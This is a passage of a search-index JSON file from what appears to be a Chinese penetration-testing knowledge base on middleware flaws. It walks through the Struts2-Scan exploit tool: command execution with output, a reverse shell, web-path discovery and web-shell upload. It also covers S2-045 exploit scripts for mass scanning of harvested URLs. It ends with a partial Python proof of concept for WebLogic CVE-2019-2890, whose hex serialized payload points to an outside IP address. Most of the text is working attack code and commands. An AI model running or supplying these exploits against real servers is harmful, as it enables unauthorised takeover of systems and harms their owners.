exit.","title":"\u5de5\u5177\u53c2\u6570\u8bf4\u660e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_3","text":"","title":"\u4f7f\u7528\u4f8b\u5b50"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_4","text":"$ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u652f\u6301\u5982\u4e0bStruts2\u6f0f\u6d1e: [+] S2-001:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.8; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-003:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.11.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-005:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.1.8.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c [+] S2-007:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.2.3; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-008:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-009:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.1.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,URL\u540e\u9762\u9700\u8981\u8bf7\u6c42\u53c2\u6570\u540d; \u9ed8\u8ba4\u4e3a: key; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-012:\u5f71\u54cd\u7248\u672cStruts Showcase App 2.0.0-2.3.13; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u53c2\u6570\u76f4\u63a5\u6dfb\u52a0\u5230URL\u540e\u9762; \u9ed8\u8ba4\u4e3a:name; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-013/S2-014:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-015:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-016:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-019:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-029:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.24.1(\u9664\u4e862.3.20.3); POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u9700\u8981\u53c2\u6570; \u9ed8\u8ba4\u53c2\u6570:message; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-032:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-033:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-037:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-045:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-046:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20 [+] S2-048:\u5f71\u54cd\u7248\u672cStruts 2.3.x with Struts 1 plugin and Struts 1 action; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-053:\u5f71\u54cd\u7248\u672cStruts 2.0.1-2.3.33,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell [+] S2-devMode:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell","title":"\u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f:"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#url","text":"$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6b63\u5728\u626b\u63cfURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-046 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-016 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-045 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-015 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-009 [*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-012","title":"\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b:"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_5","text":"$ python3 Struts2Scan.py -f urls.txt","title":"\u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b:"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#post","text":"$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}","title":"POST\u6570\u636e:"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_6","text":"# \u547d\u4ee4\u6267\u884c $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # \u53cd\u5f39shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] \u8bf7\u5728\u53cd\u5f39\u5730\u5740\u5904\u76d1\u542c\u7aef\u53e3\u5982: nc -lvvp 8080 # \u83b7\u53d6WEB\u8def\u5f84 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # \u4e0a\u4f20shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] \u6587\u4ef6\u4e0a\u4f20\u6210\u529f!","title":"\u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528:"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/","text":"Usage \u00b6 \u68c0\u6d4b\u6f0f\u6d1ePOC \u00b6 python s2_045.py http://xxx.com/a.action >python s2_045.py http://xxx.com/a.action [ Loopholes exist ] http://xxx.com/a.action \u6f0f\u6d1e\u5229\u7528POC\uff08cmd\u7248\uff09 \u00b6 python s2_045_cmd.py http://xxx.com/a.action >python s2_045_cmd.py http://xxx.com/a.action [ Loopholes exist ] http://xxx.com/a.action [ cmd ] >>ls ...... \u591a\u7ebf\u7a0b\u6279\u91cf\u68c0\u6d4b\u811a\u672c \u00b6 python S2_045_thread.py\uff08\u586b\u5199url.txt\u540e\u8fd0\u884c\uff09 \u586b\u5199url.txt\u6587\u4ef6\uff0c\u6bcf\u884c\u4e00\u4e2aurl\u5730\u5740 ( url\u4e2d\u542b.action/.do\u7684\u5730\u5740 ) \uff0c\u8fd0\u884c\u5b8c\u4ee5\u540e\u4f1a\u751f\u6210\u4e00\u4e2aresult.txt\u6587\u4ef6\u5b58\u653e\u5b58\u5728\u6f0f\u6d1e\u7684url \u5229\u7528\u641c\u7d22\u5f15\u64ce\u6279\u91cf\u68c0\u6d4b\u811a\u672c \u00b6 \u60f3\u8981\u91c7\u96c6\u7f51\u7ad9\u4e2d\u5e26.action/.do\u5730\u5740\u7684\uff0c\u8bf7\u770b\uff1a Search_S2_045 \u66f4\u591a\u8bf7\u53c2\u8003\u535a\u5ba2\uff1a nMask","title":"Index"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#usage","text":"","title":"Usage"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#poc","text":"python s2_045.py http://xxx.com/a.action >python s2_045.py http://xxx.com/a.action [ Loopholes exist ] http://xxx.com/a.action","title":"\u68c0\u6d4b\u6f0f\u6d1ePOC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#poccmd","text":"python s2_045_cmd.py http://xxx.com/a.action >python s2_045_cmd.py http://xxx.com/a.action [ Loopholes exist ] http://xxx.com/a.action [ cmd ] >>ls ......","title":"\u6f0f\u6d1e\u5229\u7528POC\uff08cmd\u7248\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#_1","text":"python S2_045_thread.py\uff08\u586b\u5199url.txt\u540e\u8fd0\u884c\uff09 \u586b\u5199url.txt\u6587\u4ef6\uff0c\u6bcf\u884c\u4e00\u4e2aurl\u5730\u5740 ( url\u4e2d\u542b.action/.do\u7684\u5730\u5740 ) \uff0c\u8fd0\u884c\u5b8c\u4ee5\u540e\u4f1a\u751f\u6210\u4e00\u4e2aresult.txt\u6587\u4ef6\u5b58\u653e\u5b58\u5728\u6f0f\u6d1e\u7684url","title":"\u591a\u7ebf\u7a0b\u6279\u91cf\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#_2","text":"\u60f3\u8981\u91c7\u96c6\u7f51\u7ad9\u4e2d\u5e26.action/.do\u5730\u5740\u7684\uff0c\u8bf7\u770b\uff1a Search_S2_045 \u66f4\u591a\u8bf7\u53c2\u8003\u535a\u5ba2\uff1a nMask","title":"\u5229\u7528\u641c\u7d22\u5f15\u64ce\u6279\u91cf\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/","text":"\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u7f51\u7ad9\u5b58\u5728\u7684.action\u3001.do\u94fe\u63a5\uff0c\u5e76\u8c03\u7528s2_045\u68c0\u6d4b\u6a21\u5757\u5bf9\u8fd9\u4e9b\u94fe\u63a5\u8fdb\u884c\u6279\u91cf\u68c0\u6d4b\u3002 Usage \u00b6 \u8fd0\u884c\u6d41\u7a0b \u00b6 \u586b\u5199url.txt python search_url.py \u68c0\u6d4burl.txt\u6587\u4ef6\u4e2d\u57df\u540d\u751f\u6210result_all.txt\u6587\u4ef6 python s2_045_judge.py \u68c0\u6d4bresult_all.txt\u6587\u4ef6\u4e2durl\u751f\u6210result.txt\u6587\u4ef6 \u6587\u4ef6\u8bf4\u660e \u00b6 url.txt\u4e3a\u5f85\u68c0\u6d4b\u7f51\u7ad9\u57df\u540d\uff08\u4e0d\u7528http,\u4e5f\u4e0d\u7528\u76ee\u5f55\u7aef\u53e3\uff09 result_all.txt\u4e3a\u68c0\u6d4b\u7f51\u7ad9\u6240\u6709.action/.do\u5730\u5740 result.txt\u4e3a\u6700\u7ec8\u5b58\u5728\u6f0f\u6d1e\u7684url\u5730\u5740\u6587\u4ef6","title":"Index"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#usage","text":"","title":"Usage"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#_1","text":"\u586b\u5199url.txt python search_url.py \u68c0\u6d4burl.txt\u6587\u4ef6\u4e2d\u57df\u540d\u751f\u6210result_all.txt\u6587\u4ef6 python s2_045_judge.py \u68c0\u6d4bresult_all.txt\u6587\u4ef6\u4e2durl\u751f\u6210result.txt\u6587\u4ef6","title":"\u8fd0\u884c\u6d41\u7a0b"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#_2","text":"url.txt\u4e3a\u5f85\u68c0\u6d4b\u7f51\u7ad9\u57df\u540d\uff08\u4e0d\u7528http,\u4e5f\u4e0d\u7528\u76ee\u5f55\u7aef\u53e3\uff09 result_all.txt\u4e3a\u68c0\u6d4b\u7f51\u7ad9\u6240\u6709.action/.do\u5730\u5740 result.txt\u4e3a\u6700\u7ec8\u5b58\u5728\u6f0f\u6d1e\u7684url\u5730\u5740\u6587\u4ef6","title":"\u6587\u4ef6\u8bf4\u660e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/","text":"CVE-2019-2890-Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u80cc\u666f \u00b6 HSCERT\u76d1\u6d4b\u53d1\u73b0WebLogic\u5b98\u65b9\u53d1\u5e03\u4e86CVE-2019-2890\u6f0f\u6d1e\u9884\u8b66\u3002\u6b64\u6f0f\u6d1e\u5b58\u5728\u4e8eWeblogic Console\u7ec4\u4ef6\u4e2d\uff0c\u672a\u7ecf\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f HTTP \u8bf7\u6c42\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 WebLogic \u662f Oracle \u516c\u53f8\u51fa\u54c1\u7684\u57fa\u4e8e JavaEE \u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0c\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0f Web \u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u3002 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002 \u7531\u4e8eT3\u534f\u8bae\u5728Weblogic\u63a7\u5236\u53f0\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u5f00\u542f\uff0c\u800cWeblogic\u9ed8\u8ba4\u5b89\u88c5\u4f1a\u81ea\u52a8\u5f00\u542f\u63a7\u5236\u53f0\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4ee5\u63a7\u5236Weblogic\u670d\u52a1\u5668\u3002 \u6f0f\u6d1ePoC\u5982\u4e0b\uff1a #!/usr/bin/python # -*- coding: utf-8 -*- # 2019-10-17 8:45 import socket import time import re import sys timeout = int ( sys . argv [ 1 ]) VUL = [ 'CVE-2019-2890' ] PAYLOAD = [ 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078' ] VER_SIG = [ ' \\\\ $Proxy[0-9]+' ] vul_no = [] vul_yes = [] vul_more_test = [] def t3handshake ( sock , server_addr ): print '\u6b63\u5728\u8fde\u63a5\u670d\u52a1\u5668...' sock . connect ( server_addr ) sock . send ( '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a' . decode ( 'hex' )) time . sleep ( 1 ) sock . recv ( 1024 ) def buildT3RequestObject ( sock , port , server_addr ): print ' %s : %d \u8fde\u63a5\u6210\u529f\uff0c\u6b63\u5728\u53d1\u9001\u8bf7\u6c42...' % ( server_addr [ 0 ], server_addr [ 1 ]) data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000 {0} ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07' . format ( ' {:04x} ' . format ( dport )) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [ data1 , data2 , data3 , data4 ]: sock . send ( d . decode ( 'hex' )) time . sleep ( 2 ) lendate = len ( sock . recv ( 2048 )) print '\u53d1\u9001\u6709\u6548\u8f7d\u8377\u8bf7\u6c42\u6210\u529f,\u63a5\u6536\u957f\u5ea6: %d ' % ( lendate ) return lendate def sendEvilObjData ( sock , data , lendate ): print '\u6b63\u5728\u6267\u884c\u8f7d\u8377\uff0c\u8bf7\u7a0d\u7b49...' payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload += data payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = ' %s%s ' % ( ' {:08x} ' . format ( len ( payload ) / 2 + 4 ), payload ) sock . send ( payload . decode ( 'hex' )) time . sleep ( 2 ) sock . send ( payload . decode ( 'hex' )) res = '' start = time . time () try : while True : res += sock . recv ( 4096 ) time . sleep ( 0.1 ) end = time . time () timeend = end - start if lendate == 0 and timeend > timeout : break except Exception as e : pass return res def checkVul ( res , server_addr , index ): print '\u6267\u884c\u7ed3\u679c\uff1a' p = re . findall ( VER_SIG [ index ], res , re . S ) if len ( p ) > 0 : print ' %s : %d \u5b58\u5728 %s \u6f0f\u6d1e\u3002' % ( server_addr [ 0 ], 